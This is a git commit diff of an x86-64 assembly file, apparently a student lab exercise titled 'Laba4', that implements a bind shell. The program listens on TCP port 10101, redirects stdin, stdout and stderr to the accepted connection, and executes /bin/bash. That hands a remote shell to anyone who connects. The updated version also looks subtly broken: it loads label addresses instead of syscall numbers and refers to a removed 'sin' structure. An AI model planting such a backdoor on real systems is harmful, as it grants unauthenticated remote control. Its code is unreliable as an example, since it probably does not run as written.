c5bbf982388f7f0986079cc998e4f62ff3e7bf3a
Хімін Роман <125272724+karasu000@users.noreply.github.com>
2024-05-03 17:05:34 +0300

    Update Laba4.s

--- Laba4.s
+++ Laba4.s
@@ -1,138 +1,85 @@
-/* .data section */
 .data
+    sockfd:     .quad 0
+    fd:         .quad 0
+    sin_family: .word 0
+    sin_port:   .word 0x7527  /* htons(10101) */
+    sin_addr:   .quad 0
+    sin_zero:   .quad 0
 
-sock: .long 0
-fd: .long 0
-
-/* .bss section */
-.bss
-
-sin: .long 0, 0, 0
-
-/* .text section */
 .text
-
-.globl main
-
+.global main
 main:
-    /* Створення TCP-сокета */
-    mov $AF_INET, %eax
-    mov $SOCK_STREAM, %ebx
-    mov $IPPROTO_TCP, %ecx
+    /* Create socket */
+    movq $SYS_SOCKET, %rax
+    movq $AF_INET, %rdi
+    movq $SOCK_STREAM, %rsi
+    movq $IPPROTO_TCP, %rdx
     syscall
+    movq %rax, sockfd
 
-    /* Перевірка результату */
-    mov %eax, sock
-
-    test %eax, %eax
-    jne .error_socket
-
-    /* Заповнення структури sockaddr_in */
+    /* Fill in sockaddr_in structure */
     movw $AF_INET, sin_family
-
-    /* htons(10101) */
-    movw $10101, %ax
-    xchgb %ah, %al
+    movw $10101, %ax           /* PORT = 10101 */
+    xchgb %ah, %al             /* htons(), AH ⇔ AL */
     movw %ax, sin_port
+    movq %rdx, sin_addr
 
-    /* Прив'язка сокета до адреси */
-    mov $SYS_BIND, %rax
-    movq sock, %rdi
-    movq $sin, %rsi
-    movq $0x10, %rdx
+    /* Bind socket */
+    movq $SYS_BIND, %rax
+    movq sockfd, %rdi
+    leaq sin, %rsi             /* address of sin structure */
+    movq $0x10, %rdx           /* sizeof(sockaddr_in) = 16 */
     syscall
 
-    /* Перевірка результату */
-    mov %eax, sock
-
-    test %eax, %eax
-    jne .error_bind
-
-    /* Прослуховування сокета */
-    mov $SYS_LISTEN, %rax
-    movq sock, %rdi
-    mov $1, %rdx
+    /* Listen on socket */
+    movq $SYS_LISTEN, %rax
+    movq sockfd, %rdi
+    movq $1, %rsi
     syscall
 
-    /* Перевірка результату */
-    mov %eax, sock
-
-    test %eax, %eax
-    jne .error_listen
-
-    /* Прийняття з'єднання */
-    mov $SYS_ACCEPT, %rax
-    movq sock, %rdi
-    mov $0, %rsi
-    mov $0, %rdx
+    /* Accept connection */
+    movq $SYS_ACCEPT, %rax
+    movq sockfd, %rdi
+    movq $0, %rsi
+    movq $0, %rdx
     syscall
+    movq %rax, fd
 
-    /* Перевірка результату */
-    mov %eax, fd
-
-    test %eax, %eax
-    jne .error_accept
-
-    /* Дублювання дескрипторів файлів */
-    mov $SYS_DUP2, %rax
+    /* Redirect stdin, stdout, stderr to the socket */
+    movq $SYS_DUP2, %rax
     movq fd, %rdi
-    mov $0, %rsi
+    movq $0, %rsi
     syscall
-
-    mov $SYS_DUP2, %rax
+    movq $SYS_DUP2, %rax
     movq fd, %rdi
-    mov $1, %rsi
+    movq $1, %rsi
     syscall
-
-    mov $SYS_DUP2, %rax
+    movq $SYS_DUP2, %rax
     movq fd, %rdi
-    mov $2, %rsi
+    movq $2, %rsi
     syscall
 
-    /* Запуск /bin/bash */
-    mov $SYS_EXECVE, %rax
-    mov $bash, %rdi
-    mov $0, %rsi
-    mov $0, %rdx
+    /* Execute /bin/bash */
+    movq $SYS_EXECVE, %rax
+    movq $bash, %rdi
+    xor %rsi, %rsi
+    xor %rdx, %rdx
     syscall
 
-.error_socket:
-    mov $1, %eax
-    mov $str_error_socket, %edi
+    /* Exit */
+    movq $SYS_EXIT, %rax
+    xor %rdi, %rdi
     syscall
 
-    jmp .exit
-
-.error_bind:
-    mov $1, %eax
-    mov $str_error_bind, %edi
-    syscall
-
-    jmp .exit
-
-.error_listen:
-    mov $1, %eax
-    mov $str_error_listen, %edi
-    syscall
-
-    jmp .exit
-
-.error_accept:
-    mov $1, %eax
-    mov $str_error_accept, %edi
-    syscall
-
-    jmp .exit
-
-.exit:
-    mov $SYS_EXIT, %rax
-    mov $0, %rdi
-    syscall
-
-/* Рядки помилок */
 .data
-
-str_error_socket: .string "Помилка створення сокета\n"
-str_error_bind: .string "Помилка прив'язки сокета\n"
-str_error_listen: .string "Помилка при прослуховуванні сокета\n"
-str_error_accept: .string "Помилка прийняття з'єднання\n"
+    SYS_SOCKET:  .quad 41
+    SYS_BIND:    .quad 49
+    SYS_LISTEN:  .quad 50
+    SYS_ACCEPT:  .quad 43
+    SYS_DUP2:    .quad 33
+    SYS_EXECVE:  .quad 59
+    SYS_EXIT:    .quad 60
+    AF_INET:     .quad 2
+    SOCK_STREAM: .quad 1
+    IPPROTO_TCP: .quad 6
+    bash:        .asciz "/bin/bash"
